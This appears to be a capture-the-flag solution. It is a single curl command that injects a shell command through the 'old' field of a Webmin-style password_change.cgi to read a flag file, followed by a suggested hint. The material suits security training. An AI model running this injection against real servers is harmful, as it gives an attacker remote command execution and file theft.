# Solution

```
URI=https://161.35.16.37:10004
curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|cat /flag-with-unguessable-name.txt&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi'|grep CTF
```

# Hint
Consider writing: 'Hint: Sometimes you dont need to change the password. Sometimes you just need to try.'